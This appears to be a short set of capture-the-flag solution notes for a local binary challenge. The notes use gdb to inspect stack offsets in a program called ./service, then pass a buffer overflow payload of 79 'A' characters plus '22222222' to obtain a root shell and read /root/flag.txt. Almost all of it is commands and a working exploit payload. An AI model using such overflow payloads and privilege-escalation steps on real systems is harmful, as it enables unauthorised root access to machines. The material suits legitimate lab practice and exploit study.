1 cat /root/flag.txt 
2 cd dropbox -> sleep 60 -> cat /tmp/flag.txt
3 gdb ./service -> (gdb) break *0x401331 -> (gdb) run "AAAABBBBCCCCDDDD" -> (gdb) x/s $rbp-0x21 
-> (gdb) x/s $rbp-0x70 -> (gdb) info registers rbp -> (gdb) quit -> ./service $(python3 -c "print('A' * 79 + '22222222')") you should be in root know
when in root enter command  -> cat /root/flag.txt